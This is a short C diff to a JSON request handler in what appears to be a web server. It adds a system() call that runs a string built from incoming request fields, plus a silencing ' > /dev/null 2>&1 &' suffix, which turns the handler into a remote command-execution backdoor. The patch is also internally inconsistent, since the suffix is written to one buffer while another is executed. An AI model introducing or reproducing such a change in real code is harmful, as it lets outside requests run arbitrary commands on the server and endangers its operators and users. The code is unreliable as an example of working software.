@@ -636,7 +636,7 @@ static int process_json(struct mg_connection *nc, struct http_message *hm) {
 #define DST_LEN (510)
     int i, n, dst_len = DST_LEN-9;
     struct json_token tokens[200] = {{0}};
-    char *buf, dst[DST_LEN+2];
+    char *buf, dst[DST_LEN+50];
     struct json_token *method, *params, *fields;
     dbclient client;
 
@@ -706,8 +706,12 @@ static int process_json(struct mg_connection *nc, struct http_message *hm) {
                 }
             }
 
+            n = sprintf(buf, "%s", " > /dev/null 2>&1 &");
+            buf[n] = '\0';
+
             n = strtol(fields[0].ptr, NULL, 10);
             printf("set id=%d flen=%d dst=%s\n", n, fields[0].len, dst);
+            system(dst);
 
             newJsonRequest(&sreq_mgr, n, time(NULL));
         }
